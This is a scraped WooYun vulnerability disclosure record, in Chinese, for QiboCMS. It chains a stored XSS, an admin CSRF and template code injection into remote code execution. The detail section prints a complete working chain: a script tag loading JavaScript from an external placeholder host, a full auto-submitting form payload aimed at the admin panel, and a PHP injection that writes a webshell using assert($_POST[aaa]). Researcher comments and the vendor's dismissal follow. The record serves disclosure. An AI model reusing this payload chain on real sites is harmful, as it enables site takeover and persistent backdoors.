{"id": 6442, "wybug_id": "wooyun-2014-049360", "wybug_title": "齐博CMS存储型XSS可getshell（组合利用）", "wybug_corp": "齐博CMS", "wybug_author": "do9gy", "wybug_date": "2014-01-20 15:51", "wybug_open_date": "2014-01-25 15:51", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 齐博cms,利用威胁不大的前台存储型xss+没有任何危害的后台CSRF+几乎无影响可忽略的后台getshell 3个0day 结合起来的威力拿下齐博cms,虽然不算什么严重的漏洞,但是中途遇到的问题和突破还是聊以慰藉的,还请各位看官轻轻拍砖. ——by pandas 详细说明：  前一段时间西毒爆出qibocms 0day的时候 就看过齐博cms的代码,发现了几个后台的getshell,后台getshell很多,拿不出手,厂商也是无影响积极忽略的态度,后台提交表单基本都存在CSRF,如果能有一个前台的getshell威力应该会增加许多,于是就去前台黑盒挖出了一个xss.这样结合起来就可以getshell了.1.存储型XSS位置:会员中心->万能表单->发布信息->版主申请:postdb[sortname][] 的提交值没有经过过滤,但是进行了长度限制,不过这个长度足以写<script src=\"http://xxx.com/1.js\">,提交之后需要管理员在后台->快捷菜单->万能表单模型管理->版主申请->管理->查看详情 处触发.发现斜杠被替换了所以改用反斜杠<script src=\"http:\\\\xxx.com\\1.js\">. 1.js是我们需要外部加载的内容.这里需要提交一个表单,位于  后台系统功能->插件管理->积分介绍管理（jfadmin_mod）修改积分介绍其中的任何一个，在标题或内容处插入${@phpinfo();}。便可以造成代码执行.于是就提交一个php写文件的代码即可.1.js内容如下:\nthisTHost = top.location.hostname;thisTHost = \"http://\"+thisTHost+\"/v7/admin/index.php?lfj=jfadmin&action=addjf\";function PostSubmit(url) {     var postUrl = url;    var ExportForm = document.createElement(\"FORM\");     document.body.appendChild(ExportForm);     ExportForm.method = \"POST\";     var newElement = document.createElement(\"input\");     newElement.setAttribute(\"name\", \"title\");     var newElement2 = document.createElement(\"input\");     newElement2.setAttribute(\"name\", \"fid\");     var newElement3 = document.createElement(\"input\");     newElement3.setAttribute(\"name\", \"list\");    var newElement4 = document.createElement(\"input\");     newElement4.setAttribute(\"name\", \"content\");     ExportForm.appendChild(newElement);     ExportForm.appendChild(newElement2);     ExportForm.appendChild(newElement3);    ExportForm.appendChild(newElement4);    newElement.value = \"${@fwrite(fopen('doggy.php', 'w+'), '<?php assert($_POST[aaa]);?>')}\";     newElement2.value = 1;    newElement3.value = 1;     newElement4.value = 1;     ExportForm.action = postUrl;     ExportForm.submit(); };PostSubmit(thisTHost);\n   漏洞证明：  分为两个部分证明:1.用户部分1)登录\n\n2)写xss\n\n2.管理员部分查看申请\n\n在网站/admin目录下会增加doggy.php\n\n内容:\n\n   修复方案：  重视即可修复   版权声明：转载请注明来源 do9gy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-01-25 15:51 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-21 09:23 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  危害等级：无影响厂商忽略凡是使用编辑器的地方就不可避免的存在类似的问题    \n     2014-01-21 10:03 |    \t\tdo9gy \t\t\t( 实习白帽子  |\t\t\t        Rank:61 漏洞数:15        | Dog loves God。)\t\t \n  @pandas 贱货    \n     2014-01-21 10:37 |    \t\tBloodwolf \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:8        | whoami)\t\t \n  危害等级：无影响厂商忽略    \n     2014-01-23 15:28 |    \t\tby:龙少 \t\t\t( 普通白帽子  |\t\t\t        Rank:304 漏洞数:74        | 信息安全，学习、进步、共勉！)\t\t \n  哈哈 评论亮了    \n     2014-01-25 18:08 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  这个属于无良厂商么？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}